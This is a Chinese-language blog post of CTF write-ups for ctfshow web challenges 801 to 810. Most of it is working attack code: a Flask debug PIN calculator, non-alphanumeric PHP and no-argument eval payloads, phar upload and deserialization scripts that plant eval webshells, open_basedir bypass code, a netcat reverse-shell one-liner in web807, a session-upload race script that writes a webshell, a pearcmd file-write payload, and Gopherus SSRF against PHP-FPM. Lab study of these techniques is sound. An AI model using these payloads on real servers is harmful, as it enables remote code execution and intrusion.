---
title: ctfshow 常见姿势
date: 2024-10-21 21:52:39
permalink: /pages/a43171/
author: 
  name: Cola
  link: https://the0n3.top
---
# ctfshow 常见姿势

## web801

flask pin值计算，读取文件，脚本计算pin码。梭哈

非预期：`url/file?filename=/flag`

预期：

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'root'  # username，通过/etc/passwd
    'flask.app',  # modname，默认值
    'Flask',  # 默认值
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # moddir，通过报错获得
]
# 填入获取的16进制即可，后面添加了转换功能
address = '02:42:ac:0c:e8:a0'
address = int(address.replace(':', ''),16)
private_bits = [
    f'{address}',  # mac十进制值 /sys/class/net/eth0/address
    '225374fa-04bc-4346-9f39-48fa82829ca934b345d280f694439fa54c01aa968eef81f55a7e5baa3e39db57884e39217606'  # 看上面machine-id部分
]

# 下面为源码里面抄的，不需要修改
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
        else:
            rv = num

print(rv)

# 下面为源码里面抄的，不需要修改
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

![1](https://the0n3.top/medias/show800/1.png)


## web802

限制非字母数字，可以用字符，自增构造字符

构造`$_GET[_]($_GET[__])`

```php
<?php
$___=((''/'').'')[''==_];# $___ = N
$____=((''/'').'')[''==''];# $____ = A
++$____;
++$____;
++$____;
$_____=++$____; # $_____ = E

++$____;
++$____;
$______ = $____; # $______ = G

++$___;++$___;++$___;++$___;++$___;
$_______=++$___; # $______ = T# 

$________='_'.$______.$_____.$_______;
$$________[_]($$________[__]); # $_GET[_]($_GET[__])
```

简化

```php
$___=((''/'').'')[''==_];$____=((''/'').'')[''==''];++$____;++$____;++$____;$_____=++$____;++$____;++$____;$______ = $____;++$___;++$___;++$___;++$___;++$___;$_______=++$___;$________='_'.$______.$_____.$_______;$$________[_]($$________[__]);
```

整个payload使用post发包，url编码一下，避免`$`,`=`具有特殊语意

![2](https://the0n3.top/medias/show800/2.png)

## web803

phar文件包含，第一次接触，后续详细学习一下

这里审计起来有点奇怪，不存在`$file.txt`就写一个`$file`，写了`$file`那`$file.txt`不还是不存在？通过`file_put_contents`函数直接写🐎不现实了，可以了解到这里可以通过phar打包一个`$file.txt`到服务器，使文件包含成为了可能

```php
if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

生成phar文件，里面打包一个`a.txt`，内容为`<?php highlight_file(__FILE__);eval($_POST[1]);?>`

```php
<?php
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php highlight_file(__FILE__);eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>
```

使用python发包

```python
import requests

url="http://7fce7e3d-4206-4f91-b196-7536bde12046.challenge.ctf.show/"

data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

通过phar协议包含文件

![3](https://the0n3.top/medias/show800/3.png)

## web804

unlink会触发反序列化

```php
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

重点在`hacker`类析构函数存在命令执行

```php
<?php 
class hacker{
    public $code = 'system("tac /f*;tac f*");';
}
$a=new hacker();
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->setMetadata($a);
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "111");
$phar->stopBuffering();
?>
```

python发包

```python
import requests

url="http://4d03da6f-da2a-4b1e-beb3-b1ad422e3af6.challenge.ctf.show/"

data1={'file':'/tmp/aa.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

![4](https://the0n3.top/medias/show800/4.png)


## web805

通过phpinfo()函数回显看到限定了目录，禁用了系统命令函数

```plaintext
open_basedir	/var/www/html
disable_classes	SoapClient,mysqli,mysql,pdo,phar
disable_functions	system,exec,shell_exec,passthru,popen,fopen,popen,pcntl_exe	
```

参考文章[open_basedir绕过](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)

学习到一些姿势

通过glob://协议和原生类搭配利用，可以列出根目录文件

![5](https://the0n3.top/medias/show800/5.png)

```php
1=$it = new DirectoryIterator("glob:///*");
foreach($it as $f) {
    printf($f->getFilename()."  ");
}
```

尝试使用原生类读取，失败了。看了单是原生类绕不过去

```php
$f = new SplFileObject("php://filter/convert.base64-encode/resource=/ctfshowflag");
echo $f->fread($f->getSize());
```

scandir()函数搭配glob://协议，也可以列出根目录文件

```php
var_dump(scandir('glob:///*'));
```

一个绕过思路

在当前文件夹`/var/www/html`里建立了子文件夹`test`，进入了子文件夹test，利用ini_set函数，把`/var/www/html`下的子目录test下，使用ini_set函数设置`..`上一级目录，也就是`/var/www/html`目录

我的思考：这里的`..`存在双重含义

- /var/www/html
- ..

因此，产生了目录穿越的利用点，通过chdir函数一直切到了根目录，最后把open_basedir设置在了根目录，使highlight_file函数读取了flag成了可能

```php
mkdir('test');
chdir('test');
var_dump(ini_set('open_basedir','..'));
chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');
var_dump(ini_set('open_basedir','/'));
highlight_file('ctfshowflag');
```

## web806

php无参RCE

只能使用无参函数

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```

好在在ctfshow命令执行题单中记录了一下payload，获取最后一个定义的变量并执行，程序里最后一个定义的无法控制，可以在post里传入一个来执行

```php
eval(array_pop(next(get_defined_vars())));
```

![6](https://the0n3.top/medias/show800/6.png)

## web807

题目使用了`shell_exec`函数，想尝试写文件来着，好像没有写，只能弹个shell了

```bash
https://baidu.com;nc ip port -e /bin/sh;
```

## web808

session文件包含，脚本条件竞争

![7](https://the0n3.top/medias/show800/7.png)

```php
import io
import requests
import threading
# 如果题目链接是https，换成http
# url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
url = 'http://092d8949-e4c3-4d0b-8478-240a371fd53c.challenge.ctf.show/'
sessionid = 'ctfshow'

def write(session): # 写入临时文件
    while True:
        fileBytes = io.BytesIO(b'a'*1024*50) # 50kb
        session.post(url,
        cookies = {'PHPSESSID':sessionid},
        data = {'PHP_SESSION_UPLOAD_PROGRESS':'<?php file_put_contents("shell.php","<?php highlight_file(__FILE__);eval(\$_GET[1]);?>");?>'},
        files={'file':('1.jpg',fileBytes)}
        )

def read(session):
    while True:
        session.get(url + '?file=/tmp/sess_' + sessionid) # 进行文件包含
        r = session.get(url+'shell.php') # 检查是否写入一句话木马
        if r.status_code == 200:
            print('OK')
            return ''

evnet=threading.Event() # 多线程

session = requests.session()
for i in range(5):
    threading.Thread(target = write,args = (session,)).start()
for i in range(5):
    threading.Thread(target = read,args = (session,)).start()

evnet.set()
```

## web809

过滤的不够严格，上一题的脚本仍然可以跑

![8](https://the0n3.top/medias/show800/8.png)

学习下题目的预期考察知识`pear`，很新奇，第一次碰到

引入**P牛**师傅原话

::: tip
pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。
:::

原本pear/pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事

先包含`pear`文件，利用php的命令行参数`config-create`写文件，所以payload：

payload里存在`&`,`+`等特殊字符，直接使用hackbar发包会被编码失去原意，导致执行失败，所以要使用bp发包

```php
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=highlight_file(__FILE__);eval($_POST[1]);?>+/tmp/11
```

天马行空

![9](https://the0n3.top/medias/show800/9.png)

## web810

SSRF打PHP-FPM

项目地址https://github.com/tarunkant/Gopherus，工具下载地址：https://github.com/tarunkant/Gopherus/archive/refs/heads/master.zip

```bash
mkdir web810
cd web810
wget https://github.com/tarunkant/Gopherus/archive/refs/heads/master.zip
unzip master.zip
cd Gopherus-master
python2 gopherus.py --exploit fastcgi
```
拿到的payload，在`gopher://127.0.0.1:9000/`后的内容还需要再url编码一下

![10](https://the0n3.top/medias/show800/10.png)

![11](https://the0n3.top/medias/show800/11.png)


参考、致谢：

- [open_basedir绕过](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)